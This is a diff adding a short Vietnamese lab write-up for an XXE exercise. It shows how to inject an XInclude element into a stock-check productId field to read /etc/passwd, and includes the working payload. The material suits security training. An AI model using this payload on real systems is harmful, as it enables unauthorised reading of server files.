@@ -477,3 +477,16 @@
 > Tag: Practitioner
 >
 > Des: Chứa tính năng check stock, không kiểm soát hết được XML nên không thể xác định DTD để khởi chạy XXE cổ điển. Chèn XInclue để truy xuất path: /etc/passwd
+
+> Bài này khi check stock thì nó không trả về XML:
+> ![img](../asset/xxe-Exploiting-XInclude-to-retrieve-files-0.png)
+
+> Thay productId:
+>
+> Script:
+>
+> ```
+> <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+> ```
+>
+> ![img](../asset/xxe-Exploiting-XInclude-to-retrieve-files-1.png) ![img](../asset/xxe-Exploiting-XInclude-to-retrieve-files-2.png)
